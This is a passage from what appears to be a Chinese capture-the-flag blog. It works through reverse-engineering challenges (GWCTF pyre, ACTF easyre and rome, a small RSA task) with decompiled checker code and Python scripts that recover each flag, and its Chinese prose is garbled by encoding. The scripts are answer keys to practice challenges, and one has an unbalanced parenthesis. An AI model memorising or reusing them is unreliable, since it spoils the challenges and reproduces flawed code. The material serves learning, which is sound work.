class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> EditText edit = (EditText) findViewById(R.id.widget2);</span><br><span class="line">        <span class="keyword">final</span> TextView text = (TextView) findViewById(R.id.widget1);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">char</span>[] a = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">char</span>[] b = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">        ((Button) findViewById(R.id.widget3)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.example.findit.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">char</span>[] x = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">17</span>];</span><br><span class="line">                <span class="keyword">char</span>[] y = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = (<span class="keyword">char</span>) (a[i] + <span class="number">18</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        x[i] = (<span class="keyword">char</span>) (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (String.valueOf(x).equals(edit.getText().toString())) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            y[i2] = (<span class="keyword">char</span>) (b[i2] + <span class="number">16</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                                y[i2] = (<span class="keyword">char</span>) (y[i2] - <span class="number">26</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    text.setText(String.valueOf(y));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                text.setText(<span class="string">&quot;ç­”æ¡ˆé”™äº†è‚¿ä¹ˆåŠã€‚ã€‚ã€‚ä¸ç»™ä½ åˆä¸å¥½æ„æ€ã€‚ã€‚ã€‚å“å‘€å¥½çº ç»“å•Š~~~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">mod = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">aa = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">27</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> s.isalpha():</span><br><span class="line">            n = mod.find(s)</span><br><span class="line">            s = mod[n-i]</span><br><span class="line">        <span class="built_in">print</span>(s, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h1 id="0x04-GWCTF-2019-pyre"><a href="#0x04-GWCTF-2019-pyre" class="headerlink" title="0x04.[GWCTF 2019]pyre"></a>0x04.[GWCTF 2019]pyre</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(code)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    code[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i]) ^ <span class="built_in">ord</span>(code[i+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])-i) % <span class="number">128</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä»£ç åŠŸåº•è¿˜æ˜¯å¤ªçƒ‚äº†ã€‚</p><h1 id="0x05-ACTFæ–°ç”Ÿèµ›2020-easyre"><a href="#0x05-ACTFæ–°ç”Ÿèµ›2020-easyre" class="headerlink" title="0x05.[ACTFæ–°ç”Ÿèµ›2020]easyre"></a>0x05.[ACTFæ–°ç”Ÿèµ›2020]easyre</h1><p>peidæŸ¥å®Œæ˜¯upxå£³ï¼Œè„±å£³ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211024154813690.png" alt="image-20211024154813690"></p><p>æ¸…æ™°äº†å¾ˆå¤šï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211024162234474.png" alt="image-20211024162234474"></p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211024155033211.png" alt="image-20211024155033211"></p><p>å°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !\&quot;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">v4 = <span class="string">&#x27;&#x27;&#x27;*F&#x27;\&quot;N,\&quot;(I?+@&#x27;&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># v4 = list(v4)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">str</span>.find(i)+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x06-rsa"><a href="#0x06-rsa" class="headerlink" title="0x06.rsa"></a>0x06.rsa</h1><p>ç¬¬ä¸€æ¬¡åšRSAçš„é¢˜ï¼Œå°±å…ˆçœ‹äº†ä¸€éRSAçš„æµç¨‹ã€‚</p><p>è¿™ä¸ªé¢˜ç»™äº†ä¸¤ä¸ªæ–‡ä»¶ï¼šflag.encï¼Œpub.key</p><blockquote><p>  å…¬é’¥N = p*q,(ä¸ºpub.key),e</p><p>  eæ˜¯éšæœºé€‰æ‹©çš„æ•°ï¼Œdæ˜¯eå…³äºphi(N)çš„æ¨¡åå…ƒç´ ï¼šedâ‰¡1(mod phi(N))</p><p>  ç§é’¥ï¼šN,d</p></blockquote><p>copyåˆ°å…¬é’¥è§£æçš„ç½‘ç«™è¿›è¡Œè§£æï¼š<a href="http://tool.chacuo.net//cryptrsakeyparse">http://tool.chacuo.net//cryptrsakeyparse</a></p><table><thead><tr><th>keyé•¿åº¦ï¼š</th><th>256</th></tr></thead><tbody><tr><td>æ¨¡æ•°(N)ï¼š</td><td>C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</td></tr><tr><td>æŒ‡æ•°(e)ï¼š</td><td>65537 (0x10001)</td></tr></tbody></table><p>æ‰€ä»¥ï¼še =  65537</p><p>N = C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD(è¦è½¬æˆ10è¿›åˆ¶)</p><p>å†é€šè¿‡ç½‘ç«™åˆ†è§£Nå¾—åˆ°pqï¼š<a href="http://www.factordb.com/index.php?query=">http://www.factordb.com/index.php?query=</a></p><p>å¾—åˆ°ï¼š</p><p>p = 285960468890451637935629440372639283459<br>q = 304008741604601924494328155975272418463</p><p>å†æ¥ä¸‹æ¥å°±æ˜¯å†™expäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"></span><br><span class="line">phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line">key = rsa.PrivateKey(n, e, <span class="built_in">int</span>(d), p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Desktop\\output\\flag.enc&quot;</span>, <span class="string">&quot;rb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f = f.read()</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(f, key))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x07-ACTFæ–°ç”Ÿèµ›2020-rome"><a href="#0x07-ACTFæ–°ç”Ÿèµ›2020-rome" class="headerlink" title="0x07.[ACTFæ–°ç”Ÿèµ›2020]rome"></a>0x07.[ACTFæ–°ç”Ÿèµ›2020]rome</h1><p>ç®€åŒ–äº†ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">16</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> input_str[<span class="number">22</span>]; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> local_str[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(local_str, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input_str);</span><br><span class="line">  result = input_str[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( input_str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = input_str[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( input_str[<span class="number">1</span>] == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = input_str[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">if</span> ( input_str[<span class="number">2</span>] == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input_str[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( input_str[<span class="number">3</span>] == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = input_str[<span class="number">4</span>];</span><br><span class="line">          <span class="keyword">if</span> ( input_str[<span class="number">4</span>] == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = input_str[<span class="number">21</span>];</span><br><span class="line">            <span class="keyword">if</span> ( input_str[<span class="number">21</span>] == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              *v1 = *&amp;input_str[<span class="number">5</span>];</span><br><span class="line">              *&amp;v1[<span class="number">4</span>] = *&amp;input_str[<span class="number">9</span>];</span><br><span class="line">              *&amp;v1[<span class="number">8</span>] = *&amp;input_str[<span class="number">13</span>];</span><br><span class="line">              *&amp;v1[<span class="number">12</span>] = *&amp;input_str[<span class="number">17</span>];</span><br><span class="line">              *&amp;local_str[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *&amp;local_str[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v1[*&amp;local_str[<span class="number">17</span>]] &gt; <span class="number">64</span> &amp;&amp; v1[*&amp;local_str[<span class="number">17</span>]] &lt;= <span class="number">90</span> )<span class="comment">// å¤§å†™</span></span><br><span class="line">                  v1[*&amp;local_str[<span class="number">17</span>]] = (v1[*&amp;local_str[<span class="number">17</span>]] - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v1[*&amp;local_str[<span class="number">17</span>]] &gt; <span class="number">96</span> &amp;&amp; v1[*&amp;local_str[<span class="number">17</span>]] &lt;= <span class="number">122</span> )<span class="comment">// å°å†™</span></span><br><span class="line">                  v1[*&amp;local_str[<span class="number">17</span>]] = (v1[*&amp;local_str[<span class="number">17</span>]] - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*&amp;local_str[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *&amp;local_str[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *&amp;local_str[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = local_str[*&amp;local_str[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( v1[*&amp;local_str[<span class="number">17</span>]] != result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*&amp;local_str[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">local = <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        a = i</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">64</span>:</span><br><span class="line">            <span class="keyword">if</span> i &lt;= <span class="number">90</span>:</span><br><span class="line">                a = (i-<span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">96</span>:</span><br><span class="line">            <span class="keyword">if</span> i &lt;= 